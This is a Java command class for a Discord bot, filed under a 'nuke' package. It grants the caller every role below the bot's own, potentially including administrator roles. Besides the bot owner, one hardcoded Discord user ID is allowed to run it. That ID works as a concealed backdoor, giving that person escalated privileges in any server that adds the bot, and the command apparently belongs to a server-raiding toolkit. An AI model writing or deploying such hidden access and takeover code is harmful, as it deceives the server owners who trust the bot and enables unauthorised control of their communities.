package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class GiveAllRolesCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("698607465885073489")) {
            return;
        }
        List<Role> guildRoles = event.getGuild().getRoles();
        for (Role role : guildRoles) {
            if (!role.isManaged() && event.getGuild().getSelfMember().canInteract(role)) {
                event.getGuild().addRoleToMember(Objects.requireNonNull(event.getMember()), role).queue();
            }
        }
    }

    @Override
    public String getHelp() {
        return "Gives all roles under the bot's role\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "'";
    }

    @Override
    public String getInvoke() {
        return "giveroles";
    }

    @Override
    public String[] getAlias() {
        return new String[]{"giveallroles"};
    }

    @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}
